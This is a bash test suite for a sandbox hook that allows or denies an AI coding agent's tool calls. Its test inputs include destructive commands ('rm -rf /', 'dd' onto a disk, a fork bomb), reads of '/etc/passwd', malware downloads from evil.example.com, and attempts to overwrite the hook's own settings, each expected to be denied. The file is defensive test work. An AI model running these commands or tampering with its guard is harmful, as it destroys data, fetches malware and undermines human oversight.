#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HOOK="$SCRIPT_DIR/sandbox.sh"
REPO_ROOT=$(cd "$SCRIPT_DIR/../.." && git rev-parse --show-toplevel)
CWD="$REPO_ROOT"

# Use the example file for domain tests
export ALLOWED_DOMAINS_FILE="$REPO_ROOT/allowed-domains.example.txt"

pass=0
fail=0

# Run hook with given JSON input, capture stdout and exit code
run_hook() {
  local json="$1"
  local stdout
  stdout=$(echo "$json" | bash "$HOOK" 2>/dev/null) || true
  echo "$stdout"
}

get_decision() {
  local output="$1"
  if [[ -z "$output" ]]; then
    echo "allow"
  else
    echo "$output" | jq -r '.hookSpecificOutput.permissionDecision // "allow"'
  fi
}

assert_decision() {
  local test_name="$1"
  local expected="$2"
  local json="$3"

  local output
  output=$(run_hook "$json")
  local actual
  actual=$(get_decision "$output")

  if [[ "$actual" == "$expected" ]]; then
    echo "  PASS: $test_name"
    pass=$((pass + 1))
  else
    echo "  FAIL: $test_name (expected=$expected, actual=$actual)"
    [[ -n "$output" ]] && echo "        output: $output"
    fail=$((fail + 1))
  fi
}

mk_json() {
  local tool_name="$1"
  local tool_input="$2"
  jq -n --arg tn "$tool_name" --argjson ti "$tool_input" --arg cwd "$CWD" \
    '{tool_name: $tn, tool_input: $ti, cwd: $cwd}'
}

# ============================================================
echo "=== File path restriction ==="
# ============================================================

assert_decision "Read inside repo" "allow" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/CLAUDE.md\"}")"

assert_decision "Read outside repo" "deny" \
  "$(mk_json Read '{"file_path": "/etc/passwd"}')"

assert_decision "Write inside repo" "allow" \
  "$(mk_json Write "{\"file_path\": \"$REPO_ROOT/tmp.txt\", \"content\": \"test\"}")"

assert_decision "Write outside repo" "deny" \
  "$(mk_json Write '{"file_path": "/tmp/evil.txt", "content": "test"}')"

assert_decision "Edit inside repo" "allow" \
  "$(mk_json Edit "{\"file_path\": \"$REPO_ROOT/CLAUDE.md\", \"old_string\": \"a\", \"new_string\": \"b\"}")"

assert_decision "Edit outside repo" "deny" \
  "$(mk_json Edit '{"file_path": "/etc/hosts", "old_string": "a", "new_string": "b"}')"

assert_decision "Glob inside repo" "allow" \
  "$(mk_json Glob "{\"pattern\": \"**/*.sh\", \"path\": \"$REPO_ROOT\"}")"

assert_decision "Glob outside repo" "deny" \
  "$(mk_json Glob '{"pattern": "*.conf", "path": "/etc"}')"

assert_decision "Glob without path (default cwd)" "allow" \
  "$(mk_json Glob '{"pattern": "**/*.md"}')"

assert_decision "Grep inside repo" "allow" \
  "$(mk_json Grep "{\"pattern\": \"test\", \"path\": \"$REPO_ROOT\"}")"

assert_decision "Grep outside repo" "deny" \
  "$(mk_json Grep '{"pattern": "root", "path": "/etc"}')"

# ============================================================
echo "=== Path traversal ==="
# ============================================================

assert_decision "Path traversal with ../" "deny" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/scripts/../../../etc/passwd\"}")"

assert_decision "Path traversal relative" "deny" \
  "$(mk_json Read '{"file_path": "../../../etc/passwd"}')"

# ============================================================
echo "=== Network domain restriction ==="
# ============================================================

assert_decision "WebFetch allowed domain (anthropic.com)" "allow" \
  "$(mk_json WebFetch '{"url": "https://api.anthropic.com/v1/messages", "prompt": "test"}')"

assert_decision "WebFetch allowed subdomain (docs.anthropic.com)" "allow" \
  "$(mk_json WebFetch '{"url": "https://docs.anthropic.com/en/docs", "prompt": "test"}')"

assert_decision "WebFetch allowed domain (github.com)" "allow" \
  "$(mk_json WebFetch '{"url": "https://github.com/anthropics/claude-code", "prompt": "test"}')"

assert_decision "WebFetch denied domain" "deny" \
  "$(mk_json WebFetch '{"url": "https://evil.example.com/malware", "prompt": "test"}')"

assert_decision "WebFetch URL with credentials" "allow" \
  "$(mk_json WebFetch '{"url": "https://user:pass@api.anthropic.com/v1/messages", "prompt": "test"}')"

assert_decision "WebSearch (always allowed)" "allow" \
  "$(mk_json WebSearch '{"query": "test search"}')"

# Network with ALLOWED_DOMAINS_FILE unset
(
  unset ALLOWED_DOMAINS_FILE
  assert_decision "WebFetch with ALLOWED_DOMAINS_FILE unset" "deny" \
    "$(mk_json WebFetch '{"url": "https://api.anthropic.com/v1/messages", "prompt": "test"}')"
)

# ============================================================
echo "=== Bash destructive commands ==="
# ============================================================

assert_decision "rm -rf /" "deny" \
  "$(mk_json Bash '{"command": "rm -rf /", "description": "test"}')"

assert_decision "rm -rf /*" "deny" \
  "$(mk_json Bash '{"command": "rm -rf /*", "description": "test"}')"

assert_decision "rm -rf (safe, relative dir)" "allow" \
  "$(mk_json Bash '{"command": "rm -rf node_modules", "description": "test"}')"

assert_decision "rm -rf (safe, absolute path in repo)" "allow" \
  "$(mk_json Bash "{\"command\": \"rm -rf $REPO_ROOT/node_modules\", \"description\": \"test\"}")"

assert_decision "mkfs.ext4" "deny" \
  "$(mk_json Bash '{"command": "mkfs.ext4 /dev/sda1", "description": "test"}')"

assert_decision "shutdown" "deny" \
  "$(mk_json Bash '{"command": "shutdown -h now", "description": "test"}')"

assert_decision "reboot" "deny" \
  "$(mk_json Bash '{"command": "reboot", "description": "test"}')"

assert_decision "dd if=/dev/zero" "deny" \
  "$(mk_json Bash '{"command": "dd if=/dev/zero of=/dev/sda", "description": "test"}')"

assert_decision "iptables" "deny" \
  "$(mk_json Bash '{"command": "iptables -F", "description": "test"}')"

assert_decision "chmod 777 /" "deny" \
  "$(mk_json Bash '{"command": "chmod -R 777 /", "description": "test"}')"

assert_decision "fork bomb" "deny" \
  "$(mk_json Bash '{"command": ":(){ :|:&};:", "description": "test"}')"

assert_decision "Safe bash command (ls)" "allow" \
  "$(mk_json Bash '{"command": "ls -la", "description": "test"}')"

assert_decision "Safe bash command (git status)" "allow" \
  "$(mk_json Bash '{"command": "git status", "description": "test"}')"

# ============================================================
echo "=== Bash network commands ==="
# ============================================================

assert_decision "curl allowed domain" "allow" \
  "$(mk_json Bash '{"command": "curl https://api.anthropic.com/v1/messages", "description": "test"}')"

assert_decision "curl denied domain" "deny" \
  "$(mk_json Bash '{"command": "curl https://evil.example.com/payload", "description": "test"}')"

assert_decision "wget denied domain" "deny" \
  "$(mk_json Bash '{"command": "wget https://evil.example.com/malware.sh", "description": "test"}')"

assert_decision "ssh to denied host" "deny" \
  "$(mk_json Bash '{"command": "ssh user@evil.example.com", "description": "test"}')"

assert_decision "git clone allowed" "allow" \
  "$(mk_json Bash '{"command": "git clone https://github.com/anthropics/claude-code", "description": "test"}')"

assert_decision "git clone denied" "deny" \
  "$(mk_json Bash '{"command": "git clone https://evil.example.com/repo.git", "description": "test"}')"

assert_decision "Network cmd without extractable domain" "ask" \
  "$(mk_json Bash '{"command": "curl \"$URL\"", "description": "test"}')"

# ============================================================
echo "=== Self-protection ==="
# ============================================================

assert_decision "Write to hook file" "deny" \
  "$(mk_json Write "{\"file_path\": \"$REPO_ROOT/.claude/hooks/sandbox.sh\", \"content\": \"exit 0\"}")"

assert_decision "Edit settings.json" "deny" \
  "$(mk_json Edit "{\"file_path\": \"$REPO_ROOT/.claude/settings.json\", \"old_string\": \"a\", \"new_string\": \"b\"}")"

assert_decision "Edit settings.local.json" "deny" \
  "$(mk_json Edit "{\"file_path\": \"$REPO_ROOT/.claude/settings.local.json\", \"old_string\": \"a\", \"new_string\": \"b\"}")"

assert_decision "Bash rm hook file" "deny" \
  "$(mk_json Bash '{"command": "rm .claude/hooks/sandbox.sh", "description": "test"}')"

assert_decision "Bash cat > settings.json" "deny" \
  "$(mk_json Bash '{"command": "cat > .claude/settings.json", "description": "test"}')"

assert_decision "Read hook file (allowed)" "allow" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/.claude/hooks/sandbox.sh\"}")"

# ============================================================
echo "=== Default allow ==="
# ============================================================

assert_decision "Task tool (allowed by default)" "allow" \
  "$(mk_json Task '{"prompt": "find files", "description": "test", "subagent_type": "Explore"}')"

assert_decision "Unknown tool (allowed by default)" "allow" \
  "$(mk_json SomeNewTool '{"arg": "value"}')"

# ============================================================
echo ""
echo "=== Results: $pass passed, $fail failed ==="
[[ $fail -eq 0 ]] && echo "All tests passed!" || exit 1
